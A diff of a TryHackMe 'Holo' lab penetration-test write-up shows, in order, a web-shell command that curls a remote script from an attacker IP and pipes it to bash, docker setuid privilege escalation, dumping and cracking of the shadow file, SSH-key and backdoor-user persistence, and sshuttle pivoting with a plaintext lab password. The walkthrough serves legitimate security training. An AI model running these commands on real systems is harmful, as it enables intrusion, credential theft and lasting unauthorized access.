@@ -1,7 +1,7 @@
 # External Penetration Testing - Holo Corporate Network - TryHackMe - Holo Network
 
 > Austin Lai | September 20th, 2021
-> Updated    | September 26th, 2021
+> Updated    | September 28th, 2021
 
 ---
 
@@ -1210,7 +1210,7 @@ Below is the payload we used.
 curl 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.103.20:80/rev.sh|bash &'
 
 
-# Then this is the payload with URL Encode to eliminate the issue of URl with space
+# This is the payload with URL Encode to eliminate the issue of URl with space
 curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.103.20%3A80%2Frev.sh%7Cbash%20%26'
 ```
 
@@ -1220,79 +1220,218 @@ Response of python web server on our attacker machines:
 
 ![response-python-web-server](response-python-web-server.png)
 
+Response of netcat listener on our attacker machines:
 
+![reponse-nc](reponse-nc.png)
 
+Right away, we search for binaries with setuid bit using command below:
 
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
 
+Result of setuid bit binaries:
 
+![setuid-bit-binaries](setuid-bit-binaries.png)
 
+We notice unsual ` docker ` binary with setuid, searching online with the reference <https://gtfobins.github.io/gtfobins/docker/#suid> showing we are able to exploit such ` docker ` binary with setuid bit to escalate privilege to root.
 
+![docker-setuid](docker-setuid.png)
 
+The payload we used is ` docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh -p `
 
+Privilege Escalation to root:
 
+![privesc-root](privesc-root.png)
 
+We found user.txt at /var/www directory:
 
+![user.txt-10.200.107.33](user.txt-10.200.107.33.png)
 
+Since we are root, we found root.txt at /root:
 
+![root.txt-10.200.107.33](root.txt-10.200.107.33.png)
 
+![content-root.txt](content-root.txt.png)
 
+Next, we going to enumerate system.
 
+First, dumping /etc/passwd and /etc/shadow as we know passwd and shadow are useful for us to gain access to the system as well as cracking the password of valid user:
 
+![etc-passwd](etc-passwd.png)
 
+![etc-shadow](etc-shadow.png)
 
+From the /etc/passwd, we know that - there is one non-system user --- ` linux-admin `
 
+In order for us to gain persistent access to the system, we have generated sshkey on attacker machine and copy to target system.
 
+Payload used to generated sshkey and insert to root and linux-admin user ` authorized_keys `
 
+```bash
+ssh-keygen -t rsa -f fake_id_rsa -P "" && cat fake_id_rsa.pub
+```
 
+sshkey genreated:
 
+![sshkey-generation](sshkey-generation.png)
 
+Insert attacker sshkey to root user account on target system:
 
+![insert-sshkey-root](insert-sshkey-root.png)
 
+Insert attacker sshkey to linux-admin user account on target system - including create ` .ssh ` directory as linux-admin does not have such directory that contain sshkey:
 
+![create-.ssh-folder-linux-admin](create-.ssh-folder-linux-admin.png)
 
+![insert-sshkey-linux-admin](insert-sshkey-linux-admin.png)
 
+We also create additional user just in case and as a secondary source to gain access back to the system.
 
+Payload used to generate user and change password as below:
 
+```bash
+# Create a user called "hacker"
+useradd -m hacker
 
+# Change password as "hacker" for the "hacker" user
+echo hacker:hacker | chpasswd
+```
 
+![create-user-change-password](create-user-change-password.png)
 
+Back to our attacker machine, as we have the shadow file; we can try to crack the password especially for the user "linux-admin"
 
+The hashcat command used to crack "linux-admin" password as below (note that we are using windows system for hashcat here):
 
+```
+hashcat.exe -m 1800 test2.hccapx ..\password-list\simple-rockyou.lst -o ..\cracked.txt -O
+```
 
+![hashcat-command](hashcat-command.png)
 
+The "test2.hccapx" is the hash for "linux-admin" user password from shadow file:
 
+![linux-admin-shadow-hash](linux-admin-shadow-hash.png)
 
+Result of hashcat:
 
+![result-of-hashcat](result-of-hashcat.png)
 
+As of now, we have completely own system ` 10.200.107.33 `
 
+However, as from our first nmap result there is no other system available for us. Hence we decided to ssh back to ` 10.200.107.33 ` and we notice there is ` nmap ` binary available.
 
+We have utilized nmap from ` 10.200.107.33 ` to perform quick scan for host alive by using command below:
 
+```bash
+nmap -nvv -sn 10.200.107.0/24 | grep -B 1 up
+```
 
+Result of network scan for host alive:
 
+![network-scan-for-host-alive](network-scan-for-host-alive.png)
 
+From the nmap network scan result, we know that - there are several system on the network:
 
+- 10.200.107.31
+- 10.200.107.32
+- 10.200.107.35
+- 10.200.107.30
 
+Next we perform in-depth scan for each host.
 
+Scan for 10.200.107.30 using command below:
 
+```bash
+nmap -nvv -Pn -T4 -F 10.200.107.30
+```
 
+Nmap result for 10.200.107.30
 
+![nmap-10.200.107.30](nmap-10.200.107.30.png)
 
+Scan for 10.200.107.31 using command below:
 
+```bash
+nmap -nvv -Pn -T4 -F 10.200.107.31
+```
 
+Nmap result for 10.200.107.31
 
+![nmap-10.200.107.31](nmap-10.200.107.31.png)
 
+Scan for 10.200.107.32 using command below:
 
+```bash
+nmap -nvv -Pn -T4 -F 10.200.107.32
+```
 
+Nmap result for 10.200.107.32
 
+![nmap-10.200.107.32](nmap-10.200.107.32.png)
 
+Scan for 10.200.107.35 using command below:
 
+```bash
+nmap -nvv -Pn -T4 -F 10.200.107.35
+```
 
+Nmap result for 10.200.107.35
 
+![nmap-10.200.107.35](nmap-10.200.107.35.png)
 
+We have confirmed that on our attacker machine, we are unable access to any host other than ` 10.200.107.33 `
 
+Ping result for 10.200.107.31 on our attacker machine.
 
+![ping-result-10.200.107.31](ping-result-10.200.107.31.png)
 
+Result of port 80 - http for 10.200.107.31 on our attacker machine
 
+![port-80-10.200.107.31](port-80-10.200.107.31.png)
+
+With all the information we gathered, we can conclude that Holo designed their corporate network with segmentation.
+
+We will need to forward our attacker traffic to Holo corporate network levaraging the host system we gained access which is ` 10.200.107.33 `
+
+We decided to use ` sshuttle ` - a proxy tools utilise ssh to forward our attacker traffic via ssh on ` 10.200.107.33 ` to Holo corporate network ` 10.200.107.0/24 `
+
+The command we used for ` sshuttle ` as below (note that command is executed on our attacker machine):
+
+```bash
+sudo sshuttle -D -N -r linux-admin:linuxrulez@10.200.107.33 -x 10.200.107.33 10.200.107.0/24 -vvv
+```
+
+sshuttle command:
+
+![sshuttle-command](sshuttle-command.png)
+
+Checking sshuttle process is running by issue command ` sudo ps -elf | grep sshu ` :
+
+![checking-sshuttle-process](checking-sshuttle-process.png)
+
+After ` sshuttle ` is running, we are able to access port 80 - http for ` 10.200.107.31 ` on our attacker machine.
+
+Main page for port 80 - http - ` 10.200.107.31 `
+
+![port-80-http-10.200.107.31](port-80-http-10.200.107.31.png)
+
+Source of main page for ` 10.200.107.31 `
+
+![source-main-10.200.107.31](source-main-10.200.107.31.png)
+
+As ` 10.200.107.31 ` showing login page, we decide try to log into it using the credentials found previously (that we dump from the database called "DashboardDB" that is in mysql server on 192.168.100.1).
+
+Login using admin user, however it only show blank page:
+
+![admin-login](admin-login.png)
+
+Login using gurag user, below is the response page:
+
+![gurag-login](gurag-login.png)
+
+From the trial login, we know that ` gurag ` is a valid user.
 
 
 
